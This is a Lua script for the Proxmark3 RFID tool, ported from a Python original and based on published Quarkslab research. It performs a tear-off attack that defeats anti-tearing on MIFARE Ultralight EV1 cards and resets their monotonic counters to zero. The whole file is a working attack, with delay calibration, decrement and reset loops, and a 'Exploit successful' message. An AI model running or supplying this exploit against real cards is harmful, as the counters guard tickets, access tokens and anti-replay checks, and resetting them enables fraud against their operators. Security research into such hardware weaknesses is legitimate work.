--[[
    Bypass Anti-Tearing on MIFARE Ultralight EV1 monotonic counters (tear-off).

    Lua port of client/pyscripts/mfuev1_counter_reset.py (v2.0.0), adapted to
    run inside the in-process client of the pm3-android app.

    Original script by W0rthlessS0ul (https://github.com/W0rthlessS0ul),
    updated by M35MAR (https://github.com/M35mar), based on the Quarkslab
    research: https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html

    SPDX-License-Identifier: GPL-3.0-or-later
]]

-- Known EV1 limits / artifacts
local COUNTER_MAX = 0xFFFFFF
local COUNTER_PREPARE_TARGET = 0x00FFFF
local TEAR_STUCK_VALUE = 6           -- counter may be read as 6 after a failed tear

-- Calibration and delay tuning
local DELAY_BD_MIN = 2700
local DELAY_BD_MAX = 5000
local CAL_STEP_US = 5
local DELAY_00_OFFSET = 10           -- delay_00 = BD - this offset
local DELAY_TUNE_STEP = 1
local DELAY_TUNE_JUMP = 10

local RETRY_COUNT = 3
local RETRY_SLEEP_MS = 200
local TEAR_REPAIR_ATTEMPTS = 5

-- Command/fromhex/parseRaw globals come from this require.
require('commands')
local lib14a = require('read14a')

----
-- Raw 14a exchange with field-up + select, like `hf 14a raw -s -c <bytes>`.
-- Returns the response payload as a raw byte string (no CRC), nil on failure.
local function raw14a(payload_hex)
    local flags = lib14a.ISO14A_COMMAND.ISO14A_RAW
        + lib14a.ISO14A_COMMAND.ISO14A_CONNECT
        + lib14a.ISO14A_COMMAND.ISO14A_APPEND_CRC
    local c = Command:newRaw{ tech = '14a', flags = flags, data = payload_hex, lenbits = 0 }
    local resp, err = c:sendNG(false)
    if err ~= nil or resp == nil then
        return nil
    end
    local len, _sel, raw = parseRaw('14a', resp)
    if len == nil or len < 1 or raw == nil or #raw < len then
        return nil
    end
    return raw:sub(1, len)
end

local function wake_card()
    core.console('hf 14a reader')
end

local function sleep_ms(ms)
    core.console('msleep -t' .. tostring(ms))
end

----
-- Counter helpers

--- three raw bytes (little endian, EV1 layout) to an integer
local function bytes_to_le_counter(raw)
    if raw == nil or #raw < 3 then
        return nil
    end
    return raw:byte(1) + raw:byte(2) * 256 + raw:byte(3) * 65536
end

--- integer to 6 hex chars (little endian, ready for INCR_CNT payloads)
local function le3hex(value)
    return string.format('%02X%02X%02X', value % 256, math.floor(value / 256) % 256, math.floor(value / 65536) % 256)
end

local function counter_hex(value)
    return le3hex(value)
end

local function read_counter(counter_index)
    for _ = 1, RETRY_COUNT do
        local raw = raw14a('390' .. tostring(counter_index))  -- 0x39 READ_CNT
        local value = bytes_to_le_counter(raw)
        -- A single-byte reply (e.g. 04/05/06/0A) is a NACK, not a counter:
        -- the length check above already rejects it.
        if value ~= nil then
            return value
        end
        wake_card()
        sleep_ms(RETRY_SLEEP_MS)
    end
    return nil
end

--- returns a boolean (counter tearing == BD) and the raw hex flag
local function check_tearing_event(counter_index)
    for _ = 1, RETRY_COUNT do
        local raw = raw14a('3E0' .. tostring(counter_index))  -- 0x3E CHECK_TEARING_EVENT
        if raw ~= nil and #raw >= 1 then
            local tear = raw:byte(1)
            return (tear == 0xBD), string.format('%02X', tear)
        end
        sleep_ms(RETRY_SLEEP_MS)
    end
    return false, '?'
end

local function enable_tearoff(delay_us)
    core.console('hw tearoff --delay ' .. tostring(delay_us))
    core.console('hw tearoff --on')
end

local function disable_tearoff()
    core.console('hw tearoff --off')
end

--- INCR_CNT (0xA5): counter, 3 payload bytes and the trailing 00 byte kept
--- byte-exact from the original script behaviour.
local function incr_cnt(counter_index, payload_hex)
    raw14a('A50' .. tostring(counter_index) .. payload_hex .. '00')
end

local function repair_tear_flag(counter_index)
    wake_card()
    for _ = 1, TEAR_REPAIR_ATTEMPTS do
        local _ok, tearing = check_tearing_event(counter_index)
        if tearing == '00' or tearing == 'BD' then
            return true
        end
        incr_cnt(counter_index, '000000')
        incr_cnt(counter_index, '000000')
        sleep_ms(RETRY_SLEEP_MS)
    end

    print('[!] Attempting tear-off repair...')
    enable_tearoff(2950)
    incr_cnt(counter_index, '010000')
    sleep_ms(RETRY_SLEEP_MS)
    wake_card()
    local _ok, tearing = check_tearing_event(counter_index)
    return (tearing == '00' or tearing == 'BD')
end

local function normalize_tear_flag(counter_index)
    for _ = 1, TEAR_REPAIR_ATTEMPTS * 2 do
        local _ok, tearing = check_tearing_event(counter_index)
        if tearing == '00' or tearing == 'BD' then
            return
        end
        incr_cnt(counter_index, '000000')
    end
end

local function run_decrement_step(counter_index, delay_bd, delay_00)
    enable_tearoff(delay_bd)
    incr_cnt(counter_index, '000100')
    enable_tearoff(delay_00)
    incr_cnt(counter_index, '000000')
    enable_tearoff(delay_bd)
    incr_cnt(counter_index, '000000')
    enable_tearoff(delay_00)
    incr_cnt(counter_index, '000000')
    normalize_tear_flag(counter_index)
end

local function run_reset_step(counter_index, delay_bd, delay_00)
    enable_tearoff(delay_bd)
    incr_cnt(counter_index, '010000')
    enable_tearoff(delay_00)
    incr_cnt(counter_index, '000000')
    normalize_tear_flag(counter_index)
end

local function tune_delay(delay_bd, previous_counter, current_counter, locked)
    if locked then
        return delay_bd
    end
    if current_counter == previous_counter then
        return delay_bd + DELAY_TUNE_STEP
    end
    if current_counter - previous_counter > DELAY_TUNE_JUMP then
        return math.max(DELAY_BD_MIN, delay_bd - DELAY_TUNE_STEP)
    end
    return delay_bd
end

local function is_ev1_card()
    wake_card()
    -- 0x60 GET_VERSION: response byte 5 (1-based) is the major version,
    -- 0x01 for the EV1 family.
    for _ = 1, 2 do
        local raw = raw14a('60')
        if raw ~= nil and #raw >= 5 then
            return (raw:byte(5) == 0x01)
        end
        wake_card()
        sleep_ms(RETRY_SLEEP_MS)
    end
    return false
end

local function preflight_checks(counter_index)
    wake_card()
    if not is_ev1_card() then
        print('[!] Support only Mifare UL EV1 cards')
        return false
    end

    if not repair_tear_flag(counter_index) then
        local _ok, tearing = check_tearing_event(counter_index)
        print('[!] Could not repair tear flag (got 0x' .. tearing .. ')')
        return false
    end

    local _ok, tearing = check_tearing_event(counter_index)
    if tearing ~= '00' and tearing ~= 'BD' then
        print('[!] Card does not support CHECK_TEARING_EVENT')
        return false
    end

    local counter = read_counter(counter_index)
    if counter == nil then
        print('[!] Cannot read initial counter')
        return false
    end
    if counter == COUNTER_MAX then
        print('[!] Counter is at maximum (0xFFFFFF), cannot reset')
        return false
    end
    if counter == 0 then
        print('[!] Counter is already at minimum (0)')
        return false
    end

    print(string.format('[*] Counter %s: %d (0x%s) | Tear: 0x%s',
        tostring(counter_index), counter, counter_hex(counter), tearing))
    return true
end

----
-- Calibration: walks the BD delay range until a delay both triggers the
-- tearing event and leaves the counter stable across the probe.

local function calibrate_bd_delay(counter_index)
    local best_bd = nil

    for delay_bd = DELAY_BD_MIN, DELAY_BD_MAX - 1, CAL_STEP_US do
        local initial_int = read_counter(counter_index)
        if initial_int == nil then
            repair_tear_flag(counter_index)
        else
            enable_tearoff(delay_bd)
            incr_cnt(counter_index, '000000')
            local check_tearing, tear_flag = check_tearing_event(counter_index)
            incr_cnt(counter_index, '000000')
            incr_cnt(counter_index, '000000')

            local final_int = read_counter(counter_index)
            if final_int == nil then
                repair_tear_flag(counter_index)
            else
                local stable = (final_int == initial_int)
                print(string.format('[=] Testing delay: %d us | Check tearing: %s | Counter: %s -> %s',
                    delay_bd, tear_flag, counter_hex(initial_int), counter_hex(final_int)))

                if check_tearing then
                    best_bd = delay_bd
                    if stable then
                        print('[+] Working BD delay: ' .. tostring(delay_bd) .. ' us')
                        return delay_bd, math.max(DELAY_BD_MIN, delay_bd - DELAY_00_OFFSET)
                    end
                end
            end
        end
    end

    if best_bd ~= nil then
        print('[!] Counter drift during calibration; using last BD delay: ' .. tostring(best_bd) .. ' us')
        return best_bd, math.max(DELAY_BD_MIN, best_bd - DELAY_00_OFFSET)
    end

    print('[!] Auto-calibration failed; try manual --delaybd 2720')
    return nil, nil
end

----
-- The attack itself: decrement phase, prepare phase (bring the counter to
-- 0x00FFFF), then the reset phase. As in the original, it runs until the
-- counter reaches 0; on Android there is no keyboard, so to abort early:
-- keep tapping "Disconnetti" or close the app (tear-off is disabled at
-- start-up of the next run).

local function attack_loop(counter_index, delay_bd, delay_00)
    local phase = 'decrement'
    local attempt = 0
    local reset_attempts = 0
    local delay_locked = false

    local baseline_counter = read_counter(counter_index)
    if baseline_counter == nil then
        baseline_counter = 0
    end

    local tune_reference = baseline_counter
    local reset_reference = baseline_counter

    while true do
        local counter_int = read_counter(counter_index)
        if counter_int == nil then
            repair_tear_flag(counter_index)
            sleep_ms(RETRY_SLEEP_MS)

        elseif counter_int == 0 then
            print('\n[+] Exploit successful')
            return true

        elseif counter_int == TEAR_STUCK_VALUE then
            repair_tear_flag(counter_index)

        elseif phase == 'decrement' then
            if counter_int <= COUNTER_PREPARE_TARGET then
                print('\n[=] Switching to PREPARE phase (counter <= 0x00FFFF)')
                incr_cnt(counter_index, '000000')
                sleep_ms(RETRY_SLEEP_MS)
                incr_cnt(counter_index, '000000')
                phase = 'prepare'
                reset_reference = counter_int

            else
                local initial_int = counter_int
                run_decrement_step(counter_index, delay_bd, delay_00)

                local final_int = read_counter(counter_index)
                if final_int ~= nil and final_int ~= TEAR_STUCK_VALUE then
                    local _ok, tear_flag = check_tearing_event(counter_index)
                    attempt = attempt + 1
                    print(string.format('[DEC] attempt %d | BD/00: %d/%d us | Tear: %s | %s -> %s',
                        attempt, delay_bd, delay_00, tear_flag,
                        counter_hex(initial_int), counter_hex(final_int)))

                    if final_int < initial_int then
                        print(string.format('[+] Decrement! %s -> %s (delta %d)',
                            counter_hex(initial_int), counter_hex(final_int),
                            initial_int - final_int))
                        -- consolidate the drop
                        incr_cnt(counter_index, '000000')
                        sleep_ms(RETRY_SLEEP_MS)
                        incr_cnt(counter_index, '000000')
                        normalize_tear_flag(counter_index)
                        delay_locked = true
                        tune_reference = final_int

                    elseif final_int > initial_int then
                        if delay_locked then
                            delay_locked = false
                            tune_reference = final_int
                        else
                            delay_bd = tune_delay(delay_bd, tune_reference, final_int, false)
                            tune_reference = final_int
                        end

                    else -- final_int == initial_int
                        if not delay_locked then
                            delay_bd = tune_delay(delay_bd, tune_reference, final_int, false)
                        end
                        tune_reference = final_int
                    end
                end
            end

        elseif phase == 'prepare' then
            if counter_int < COUNTER_PREPARE_TARGET then
                local diff = COUNTER_PREPARE_TARGET - counter_int
                print(string.format('[PREPARE] Incrementing by %d to reach 0x%06X...',
                    diff, COUNTER_PREPARE_TARGET))
                incr_cnt(counter_index, le3hex(diff))
                incr_cnt(counter_index, '000000')

            elseif counter_int == COUNTER_PREPARE_TARGET then
                print(string.format('[=] Counter at 0x%06X, switching to RESET phase', COUNTER_PREPARE_TARGET))
                phase = 'reset'
                reset_attempts = 0
                reset_reference = COUNTER_PREPARE_TARGET
                delay_locked = false

            else
                phase = 'decrement'
            end

        elseif phase == 'reset' then
            local initial_int = counter_int
            run_reset_step(counter_index, delay_bd, delay_00)

            local final_int = read_counter(counter_index)
            if final_int ~= nil and final_int ~= TEAR_STUCK_VALUE then
                reset_attempts = reset_attempts + 1
                print(string.format('[RESET] attempt %d | BD/00: %d/%d us | %s -> %s',
                    reset_attempts, delay_bd, delay_00,
                    counter_hex(initial_int), counter_hex(final_int)))

                if final_int == 0 then
                    print('\n[+] Exploit successful')
                    return true
                end

                if final_int > COUNTER_PREPARE_TARGET then
                    print('\n[=] Counter increased, returning to DECREMENT')
                    phase = 'decrement'
                    tune_reference = final_int
                    delay_locked = false

                elseif final_int == initial_int then
                    delay_bd = tune_delay(delay_bd, reset_reference, final_int, false)
                    reset_reference = final_int

                elseif final_int < initial_int then
                    print(string.format('[+] Reset decrement! %s -> %s',
                        counter_hex(initial_int), counter_hex(final_int)))
                    delay_locked = true
                    reset_reference = final_int
                end
            end
        end
    end
end

----
-- Argument handling: -c <0..2> (default 0), -f (skip preflight),
-- --delaybd <us> (manual, disables calibration), --delay00 <us>, -h/--help.

local function show_help()
    print('Reset the monotonic counters of Mifare UL EV1 cards (tear-off technique).')
    print('')
    print('usage: script run mfuev1_counter_reset.lua [options]')
    print('')
    print('options:')
    print('  -c <0..2>     counter index (default 0)')
    print('  -f            skip pre-flight checks')
    print('  --delaybd N   manual BD delay in us (disables auto-calibration)')
    print('  --delay00 N   manual 00 delay in us (default delaybd-10)')
    print('  -h, --help    this help')
    print('')
    print('Examples:')
    print('  script run mfuev1_counter_reset.lua -c 0')
    print('  script run mfuev1_counter_reset.lua -c 0 -f')
    print('  script run mfuev1_counter_reset.lua -c 0 --delaybd 2720 --delay00 2705')
    print('')
    print('Note: on Android the run ends only when the counter reaches 0; to')
    print('interrupt, disconnect from the PM3 or close the app.')
end

local function parse_args(argstring)
    local opts = { cnt = 0, force = false, delaybd = nil, delay00 = nil }
    local tokens = {}
    for token in string.gmatch(argstring or '', '%S+') do
        table.insert(tokens, token)
    end

    local i = 1
    while i <= #tokens do
        local token = tokens[i]
        local lowered = string.lower(token)
        if token == '-h' or lowered == '--help' then
            opts.help = true
        elseif token == '-c' or lowered == '--cnt' then
            i = i + 1
            opts.cnt = tonumber(tokens[i])
        elseif token == '-f' or lowered == '--force' then
            opts.force = true
        elseif lowered == '--delaybd' then
            i = i + 1
            opts.delaybd = tonumber(tokens[i])
        elseif lowered == '--delay00' then
            i = i + 1
            opts.delay00 = tonumber(tokens[i])
        else
            print('[?] Unknown argument: ' .. token)
        end
        i = i + 1
    end
    return opts
end

local function main(argstring)
    local opts = parse_args(argstring)

    if opts.help then
        show_help()
        return
    end

    if opts.cnt == nil or opts.cnt < 0 or opts.cnt > 2 then
        print('[!] Counter index must be 0, 1 or 2 (use -c N)')
        return
    end

    print('Attack against the monotonic counters of MFU EV1 using the tear-off technique.')
    print('Note: If the counter does not reset after a few attempts, increment it to 2^n and retry.')
    print('')

    local counter_index = tostring(opts.cnt)

    -- clean any tear-off state left behind by a previous run
    disable_tearoff()

    if not opts.force then
        if not preflight_checks(counter_index) then
            print('[?] Try the -f flag if this is a false negative')
            return
        end
    end

    local delay_bd, delay_00
    if opts.delaybd == nil then
        delay_bd, delay_00 = calibrate_bd_delay(counter_index)
        if delay_bd == nil then
            disable_tearoff()
            return
        end
    else
        delay_bd = opts.delaybd
        if opts.delay00 ~= nil then
            delay_00 = opts.delay00
            print('[+] Using manual BD delay: ' .. tostring(delay_bd) .. ' us')
            print('[+] Using manual 00 delay: ' .. tostring(delay_00) .. ' us')
        else
            delay_00 = math.max(DELAY_BD_MIN, delay_bd - DELAY_00_OFFSET)
            print('[+] Using manual BD delay: ' .. tostring(delay_bd) .. ' us')
        end
    end

    local success = attack_loop(counter_index, delay_bd, delay_00)

    disable_tearoff()
    if not success then
        print('\n[x] Attack ended without success.')
    end
end

main(args)
